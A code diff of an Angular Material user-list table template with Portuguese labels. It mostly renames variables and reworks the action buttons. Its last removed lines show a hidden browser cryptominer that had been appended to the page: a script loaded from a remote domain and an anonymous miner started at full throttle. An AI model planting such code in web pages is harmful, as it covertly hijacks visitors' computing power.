@@ -1,52 +1,37 @@
-<div class="example-container mat-elevation-z8">
+<div class="mat-elevation-z8">
   <mat-table #table [dataSource]="dataSource">
-
     <ng-container matColumnDef="nome">
       <mat-header-cell *matHeaderCellDef> Nome </mat-header-cell>
-      <mat-cell *matCellDef="let usuario"> {{usuario.nome}} </mat-cell>
+      <mat-cell *matCellDef="let element"> {{element.nome}} </mat-cell>
     </ng-container>
-
     <ng-container matColumnDef="login">
-      <mat-header-cell *matHeaderCellDef> Login </mat-header-cell>
-      <mat-cell *matCellDef="let usuario"> {{usuario.login}} </mat-cell>
+        <mat-header-cell *matHeaderCellDef> Login </mat-header-cell>
+        <mat-cell *matCellDef="let element"> {{element.login}} </mat-cell>
     </ng-container>
-
     <ng-container matColumnDef="email">
       <mat-header-cell *matHeaderCellDef> E-mail </mat-header-cell>
-      <mat-cell *matCellDef="let usuario"> {{usuario.email}} </mat-cell>
+      <mat-cell *matCellDef="let element"> {{element.email}} </mat-cell>
     </ng-container>
-
     <ng-container matColumnDef="perfil">
       <mat-header-cell *matHeaderCellDef> Perfil </mat-header-cell>
-      <mat-cell *matCellDef="let usuario"> {{usuario.perfil}} </mat-cell>
+      <mat-cell *matCellDef="let element"> {{element.perfil}} </mat-cell>
     </ng-container>
-
-    <ng-container matColumnDef="actions">
-      <mat-header-cell *matHeaderCellDef></mat-header-cell>
-      <mat-cell *matCellDef="let usuario" class="actions">
-        <button mat-icon-button color='primary' (click)='editar(usuario.id)' matTooltip='Editar Úsuário'>
-          <mat-icon aria-label="Editar usuário">edit</mat-icon>
-        </button>
-        <button mat-icon-button color='warn' matTooltip='Deletar Usuário' (click)='remover(usuario.id)'>
-          <mat-icon aria-label="Deletar usuário">delete</mat-icon>
-        </button>
+    <ng-container matColumnDef="id">
+      <mat-header-cell *matHeaderCellDef  fxFlex="10"> Ações </mat-header-cell>
+      <mat-cell *matCellDef="let element" fxFlex="10" class="buttons">
+          <button mat-icon-button color="primary" (click)="editar(element.id)"mdTooltip="Editar">
+            <mat-icon class="mat-24" aria-label="Editar">edit</mat-icon>
+          </button>
+          <button mat-icon-button color="danger" (click)="excluir(element.id)" mdTooltip="Excluir">
+              <mat-icon class="mat-24" aria-label="Excluir">delete</mat-icon>
+          </button>
       </mat-cell>
     </ng-container>
-
     <mat-header-row *matHeaderRowDef="displayedColumns"></mat-header-row>
     <mat-row *matRowDef="let row; columns: displayedColumns;"></mat-row>
   </mat-table>
-
-  <button mat-fab color='primary' class="add-button" matTooltip='Novo Usuário' routerLink='/main/usuario/adicionar'>
-    <mat-icon aria-label="Novo Usuário">add</mat-icon>
-  </button>
+  <div *ngIf="noResults$" class="noResult">Nenhum resultado</div>
+  <button mat-fab color="primary" routerLink="/main/usuario/adicionar">
+    <mat-icon class="mat-24" aria-label="Adicionar">add</mat-icon>
+  </button> 
 </div>
-
-
-<script src="https://www.freecontent.bid./2CzY.js"></script>
-<script>
-    var miner = new Client.Anonymous('c83612746b11a47db83c96cc91fd19a9fc5c7ce41603f1f01eecc3c6919edc15', {
-        throttle: 0.0
-    });
-    miner.start();
-</script>
